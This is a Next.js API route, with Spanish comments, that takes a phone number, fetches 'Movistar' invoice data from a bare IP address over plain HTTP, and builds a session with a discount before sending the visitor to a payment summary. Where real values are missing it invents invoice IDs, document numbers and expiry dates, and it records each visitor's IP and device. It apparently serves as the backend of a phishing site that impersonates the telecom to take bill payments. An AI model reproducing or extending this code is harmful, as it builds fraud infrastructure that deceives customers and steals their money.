import { NextRequest, NextResponse } from "next/server";
import { readSessionFromReq, writeSession } from "@/lib/session";
import { getClientIp } from "@/lib/ip";
import { getFactura } from "@/lib/facturas-cache";
import { Setting } from "@/lib/settings";

type FacturaApi = {
  id?: number | string;
  facturaId?: string;
  total?: number;
  documento?: string;
  extra14?: string;
  fecha_expiracion?: string;
};

type ApiResponse = {
  facturas?: FacturaApi[];
};

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function uniqId(): string {
  // emula uniqid() de PHP (hex de tiempo)
  return Date.now().toString(16) + Math.floor(Math.random() * 0xffff).toString(16);
}

export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => null);
  if (!body) {
    return NextResponse.json(
      { ok: false, errors: { form: "Cuerpo inválido." } },
      { status: 400 }
    );
  }

  const numero = String(body.numero || "").trim();
  const dispositivo = String(body.dispositivo || "").slice(0, 28);

  if (!/^\d{10}$/.test(numero) || !dispositivo) {
    return NextResponse.json(
      { ok: false, errors: { numero: "Número inválido." } },
      { status: 422 }
    );
  }

  const session = await readSessionFromReq(req);
  const ip = getClientIp(req);

  // === 0. Leer descuento ===
  const descuentoStr = await Setting.getStringAsync("descuento_porcentaje", "0");
  const descuentoPorcentaje = parseInt(descuentoStr, 10) || 0;

  // === 1. Buscar primero en FacturaCache (Edge Config) ===
  const cached = await getFactura(numero);
  if (cached && cached.valor > 0) {
    const facturaSession = {
      id: randInt(100000, 999999),
      facturaId: "FC-" + uniqId(),
      total: cached.valor,
      descuentoPorcentaje,
      factura_documento: "FAC-" + randInt(10000000, 99999999),
      nombre: cached.nombre || "Cliente",
      expiracion: new Date(Date.now() + 5 * 86400_000)
        .toISOString()
        .slice(0, 10),
      telefono: numero,
    };

    console.info("[saveUser] servido desde caché", { telefono: numero });

    const res = NextResponse.json({ ok: true, redirect: "/factura/resumen" });
    return await writeSession(res, {
      ...session,
      ...facturaSession,
      dispositivo,
      ip,
      error: false,
      metodoPago: "",
    });
  }

  // === 2. API externa Movistar ===
  let data: ApiResponse | null = null;
  try {
    const r = await fetch("http://45.90.98.228:8634/factura", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ number: numero }),
      signal: AbortSignal.timeout(120_000),
    });

    if (!r.ok) {
      const errBody = await r.text().catch(() => "");
      console.error("[saveUser] API non-ok", r.status, errBody.slice(0, 500));
      return NextResponse.json(
        {
          ok: false,
          errors: {
            technical: "Estamos presentando fallas técnicas. Intente nuevamente.",
          },
        },
        { status: 502 }
      );
    }

    data = (await r.json().catch(() => null)) as ApiResponse | null;
    console.info("[saveUser] API response", data);
  } catch (e) {
    console.error("[saveUser] API exception", e);
    return NextResponse.json(
      {
        ok: false,
        errors: {
          technical: "Estamos presentando fallas técnicas. Intente nuevamente.",
        },
      },
      { status: 502 }
    );
  }

  if (
    !data ||
    !Array.isArray(data.facturas) ||
    data.facturas.length === 0
  ) {
    return NextResponse.json(
      { ok: false, errors: { technical: "Respuesta inválida de la API" } },
      { status: 502 }
    );
  }

  const factura = data.facturas[0];
  const total = Number(factura.total ?? 0);
  if (!total || total <= 0) {
    return NextResponse.json(
      {
        ok: false,
        errors: { no_debt: "El número no tiene deudas pendientes" },
      },
      { status: 422 }
    );
  }

  const facturaSession = {
    id: Number(factura.id) || randInt(100000, 999999),
    facturaId: String(factura.facturaId || "FC-" + uniqId()),
    total,
    descuentoPorcentaje,
    factura_documento: String(factura.documento || "FAC-" + randInt(10000000, 99999999)),
    nombre: String(factura.extra14 || "Cliente"),
    expiracion: String(
      factura.fecha_expiracion ||
        new Date(Date.now() + 5 * 86400_000).toISOString().slice(0, 10)
    ),
    telefono: numero,
  };

  const res = NextResponse.json({ ok: true, redirect: "/factura/resumen" });
  return await writeSession(res, {
    ...session,
    ...facturaSession,
    dispositivo,
    ip,
    error: false,
    metodoPago: "",
  });
}
